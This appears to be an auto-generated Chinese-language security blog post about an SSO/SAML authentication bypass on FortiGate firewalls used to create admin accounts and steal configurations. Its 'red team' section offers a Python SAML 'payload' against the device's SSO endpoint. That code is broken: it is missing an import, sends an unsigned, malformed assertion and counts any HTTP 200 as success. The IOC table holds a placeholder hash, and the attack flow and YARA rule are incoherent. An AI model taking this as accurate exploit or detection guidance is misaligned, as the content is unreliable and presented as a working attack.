---
layout: post
title:  "Hackers breach Fortinet FortiGate devices, steal firewall configs"
date:   2026-01-22 12:35:26 +0000
categories: [security]
severity: critical
---

# 🚨 解析 FortiGate 設備的自動化攻擊：利用 SSO 功能創建惡意帳戶和竊取防火牆配置數據

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.8)
> * **受駭指標**: Unauthenticated attackers can bypass SSO authentication on vulnerable FortiGate firewalls via maliciously crafted SAML messages
> * **關鍵技術**: SSO, SAML, Authentication Bypass, VPN Access

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: FortiGate 設備的 SSO 功能存在一個未知的漏洞，允許攻擊者通過精心設計的 SAML 訊息來繞過身份驗證。
* **攻擊流程圖解**:
  1. 攻擊者發送一個惡意的 SAML 訊息給 FortiGate 設備
  2. FortiGate 設備驗證 SAML 訊息，但由於漏洞，驗證失敗
  3. 攻擊者創建一個新的管理員帳戶，並獲得 VPN 存取權限
  4. 攻擊者竊取防火牆配置數據
* **受影響元件**: FortiGate 設備，版本號：7.4.9 和之前的版本

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道 FortiGate 設備的 IP 地址和 SSO 功能的啟用狀態
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義 SAML 訊息的結構
    saml_message = {
        "Assertion": {
            "AttributeStatement": {
                "Attribute": [
                    {
                        "Name": "username",
                        "Value": "attacker"
                    }
                ]
            }
        }
    }
    
    # 將 SAML 訊息轉換為 XML 格式
    saml_xml = xmltodict.unparse(saml_message)
    
    # 發送 SAML 訊息給 FortiGate 設備
    response = requests.post("https://fortigate-ip/saml/SSO", data=saml_xml)
    
    # 驗證攻擊是否成功
    if response.status_code == 200:
        print("Attack successful!")
    else:
        print("Attack failed.")
    
    ```
* **繞過技術**: 攻擊者可以使用 WAF 繞過技巧，例如使用 Base64 編碼的 SAML 訊息

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 104.28.244.114 | mail.io | /var/log/fortigate.log |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule FortiGate_SSO_Attack {
        meta:
            description = "Detects FortiGate SSO attack"
            author = "Your Name"
        strings:
            $saml_message = "Assertion" nocase
            $saml_attribute = "AttributeStatement" nocase
        condition:
            $saml_message and $saml_attribute
    }
    
    ```
* **緩解措施**: 暫時關閉 FortiCloud SSO 功能，或者更新 FortiGate 設備到最新版本

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **SAML (Security Assertion Markup Language)**: 一種用於身份驗證和授權的 XML 格式的標準語言
* **SSO (Single Sign-On)**: 一種允許用戶使用單一的身份驗證憑證存取多個應用程式的技術
* **Authentication Bypass**: 一種攻擊技術，允許攻擊者繞過身份驗證機制

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/hackers-breach-fortinet-fortigate-devices-steal-firewall-configs/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1550/)


